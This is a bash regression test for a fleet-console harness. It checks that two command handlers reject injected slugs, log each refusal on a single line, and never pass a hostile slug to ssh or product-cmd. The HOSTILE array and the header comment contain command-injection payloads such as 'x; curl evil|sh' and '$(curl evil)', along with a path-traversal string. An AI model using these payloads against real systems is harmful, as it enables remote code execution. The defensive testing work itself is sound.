#!/bin/bash
# tests/slug-injection-test.sh — the chat_proposal and proposal-gate handlers,
# extracted VERBATIM from bin/poll-commands.sh, against hostile slugs.
#
# Why this test exists: both handlers used to interpolate the console-supplied
# slug UNQUOTED into an ssh command line that runs as root on a fleet box, so a
# payload of {"slug":"x; curl evil|sh"} was remote code execution on the box.
# Since BH-2657 there is no remote shell at all: the command is queued as a
# box_console_commands row. The slug is still rejected unless it is
# [A-Za-z0-9_-]+, on the hub before anything is queued AND by bcx_run on the box
# that runs it, so this test checks a hostile slug never reaches the jobs
# worker, ssh or product-cmd, and that a clean one arrives as JSON data.
# Run from anywhere: tests/slug-injection-test.sh   (exit 0 = all pass)
set -uo pipefail
. "$(dirname "$0")/lib/scratch.sh" || exit 1
DIR=$(cd "$(dirname "$0")/.." && pwd)
mkdir -p "$T/bin" "$T/logs" "$T/fakebin"
cp "$DIR/bin/fleet-conf.sh" "$DIR/bin/box-for.sh" "$T/bin/"
cp -r "$DIR/bin/lib" "$T/bin/lib"; cp "$DIR/bin/jobs-client.sh" "$T/bin/"
cat > "$T/fleet.conf" <<'EOF'
remote-os Org/remote https://r.example /api/board 4 box-remote
EOF
export FLEET_CONF="$T/fleet.conf"
# Records every ssh invocation, and — critically — whether the injected command
# ever ran. A file appearing here means the payload escaped into a shell.
printf '#!/bin/bash\nprintf "%%s\\n" "$*" >> %s/SSH.calls\n' "$T" > "$T/fakebin/ssh"; chmod +x "$T/fakebin/ssh"
printf '#!/bin/bash\nshift; exec "$@"\n' > "$T/fakebin/timeout"; chmod +x "$T/fakebin/timeout"
printf '#!/bin/bash\nexec "$@"\n' > "$T/fakebin/setsid"; chmod +x "$T/fakebin/setsid"
# The stub jobs worker records every request. The hostile slugs below all call
# `curl evil`, so a curl whose argv carries "evil" is the injected command
# running, and it leaves PWNED behind.
cat > "$T/fakebin/curl" <<EOF
#!/bin/bash
case " \$* " in *" evil"*) touch $T/PWNED; exit 0 ;; esac
{ printf '%s' "\$*" | tr '\n' ' '; echo; } >> $T/REQ.log
printf '{"created":true}\n200\n'
EOF
chmod +x "$T/fakebin/curl"
printf '#!/bin/bash\nprintf "%%s\\n" "$*" >> %s/PRODUCT.calls\n' "$T" > "$T/bin/product-cmd.sh"; chmod +x "$T/bin/product-cmd.sh"
printf '#!/bin/bash\ntrue\n' > "$T/bin/beat.sh"; chmod +x "$T/bin/beat.sh"

PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); }
bad() { FAIL=$((FAIL+1)); echo "FAIL: $1"; }

extract() {
  awk -v n="$1" '
    $0 ~ "^    # >>> " n " handler" {f=1; next}
    $0 ~ "^    # <<< " n " handler" {exit}
    f {print}' "$DIR/bin/poll-commands.sh" \
    | sed -e "1s/^    ${2})//" -e '$s/ ;;$//'
}
extract chat_proposal chat_proposal > "$T/cp.body"
extract proposal_gate 'post_proposal|kill_proposal|revise_proposal' > "$T/pg.body"
for f in cp pg; do
  [ -s "$T/$f.body" ] || { echo "FAIL: could not extract the $f handler — markers missing?"; exit 1; }
done

run() { # run <body> <type> <payload>
  HARNESS="$T" BEAT="$T/bin/beat.sh" ID="c1" PROJECT="remote-os" TYPE="$2" PAYLOAD="$3" OK=false RESULT="" \
    PATH="$T/fakebin:$PATH" JOBS_URL=https://jobs.invalid HARNESS_SECRET=test-secret JOBS_RETRIES=0 \
    bash -c 'set -uo pipefail
      . "$HARNESS/bin/jobs-client.sh"; . "$HARNESS/bin/lib/jobs/box-console-commands.sh"
      . "$HARNESS/bin/lib/box-cmd-exec.sh"; . "$HARNESS/bin/lib/cron-lines.sh"
      . "$0"; echo "OK=$OK RESULT=$RESULT"' "$T/$1.body"
}
reset() { : > "$T/SSH.calls"; : > "$T/REQ.log"; : > "$T/PRODUCT.calls"; rm -f "$T/PWNED"; }
posts() { grep -c '/api/box-console-commands$' "$T/REQ.log"; }

# ---------- 1. hostile slugs are refused, and never reach the worker or ssh ----------
# The middle two are the actual exploit shapes; the rest are the neighbourhood.
HOSTILE=(
  'x; curl evil|sh'
  'x$(curl evil)'
  '`curl evil`'
  'x && curl evil'
  'x
curl evil'
  '../../etc/passwd'
  'x y'
  ''
)
for BODY in cp pg; do
  TYPE=chat_proposal; [ "$BODY" = pg ] && TYPE=post_proposal
  for S in "${HOSTILE[@]}"; do
    reset
    P=$(jq -nc --arg s "$S" '{slug:$s,message:"hi",notes:"n"}')
    OUT=$(run "$BODY" "$TYPE" "$P")
    grep -q 'OK=false' <<<"$OUT" || bad "$BODY: hostile slug should be refused: $(printf %q "$S") -> $OUT"
    [ -s "$T/SSH.calls" ] && bad "$BODY: hostile slug REACHED ssh: $(printf %q "$S") -> $(cat "$T/SSH.calls")"
    [ -s "$T/REQ.log" ] && bad "$BODY: hostile slug was QUEUED: $(printf %q "$S") -> $(cat "$T/REQ.log")"
    [ -s "$T/PRODUCT.calls" ] && bad "$BODY: hostile slug reached product-cmd: $(printf %q "$S")"
    [ -f "$T/PWNED" ] && bad "$BODY: INJECTED COMMAND EXECUTED for $(printf %q "$S")"
  done
done
ok

# ---------- 2. a legitimate slug is queued, as data ----------
for BODY in cp pg; do
  TYPE=chat_proposal; [ "$BODY" = pg ] && TYPE=post_proposal
  reset
  P='{"slug":"weekly-digest_v2","message":"hi","notes":"n"}'
  OUT=$(run "$BODY" "$TYPE" "$P")
  grep -q 'OK=true RESULT=queued for box-remote' <<<"$OUT" && [ "$(posts)" = 1 ] && [ ! -s "$T/SSH.calls" ] \
    && ok || bad "$BODY: a clean slug must be queued once (out=$OUT req=$(cat "$T/REQ.log") ssh=$(cat "$T/SSH.calls"))"
  # The slug travels inside the row's payload string, byte for byte.
  grep -qF '"payload":"{\"slug\":\"weekly-digest_v2\"' "$T/REQ.log" \
    && ok || bad "$BODY: the slug must ride inside the row payload (req=$(cat "$T/REQ.log"))"
  [ -f "$T/PWNED" ] && bad "$BODY: clean slug somehow executed curl evil"
done

# ---------- 3. the refusal is journaled ----------
# A refused command that leaves no trace is a security event nobody can review.
reset; : > "$T/logs/console-commands.log"
run cp chat_proposal '{"slug":"x; curl evil|sh","message":"hi"}' >/dev/null
grep -q 'REFUSED' "$T/logs/console-commands.log" \
  && ok || bad "a refused slug must be journaled (got: $(cat "$T/logs/console-commands.log"))"
# ...on ONE line — the hostile slug must not be able to forge journal entries.
[ "$(grep -c . "$T/logs/console-commands.log")" -eq 1 ] \
  && ok || bad "the journal must stay one line per refusal (got $(grep -c . "$T/logs/console-commands.log"))"

# ---------- 4. the box refuses a hostile slug too ----------
# The hub check is the primary guard; bcx_run's own check is the backstop on
# the box that runs the row, for the day a row arrives by another path. Drive
# the real bcx_run with the hostile slugs: none may reach product-cmd.
printf 'remote-os Org/remote https://r.example /api/board 4 local\n' > "$T/fleet-local.conf"
for S in "${HOSTILE[@]}"; do
  for TY in chat_proposal post_proposal; do
    : > "$T/PRODUCT.calls"
    GOT=$(HARNESS="$T" FLEET_CONF="$T/fleet-local.conf" PATH="$T/fakebin:$PATH" bash -c '
      . "$HARNESS/bin/lib/box-cmd-exec.sh"; bcx_run "$1" remote-os "$2" c1; echo "$BCX_OK $BCX_RESULT"' _ \
      "$TY" "$(jq -nc --arg s "$S" '{slug:$s,message:"hi",notes:"n"}')")
    [ "${GOT%% *}" = 0 ] && [ ! -s "$T/PRODUCT.calls" ] \
      && ok || bad "bcx_run $TY ran a hostile slug $(printf %q "$S"): $GOT"
  done
done

echo "slug-injection-test: $PASS pass, $FAIL fail"
[ "$FAIL" -eq 0 ]
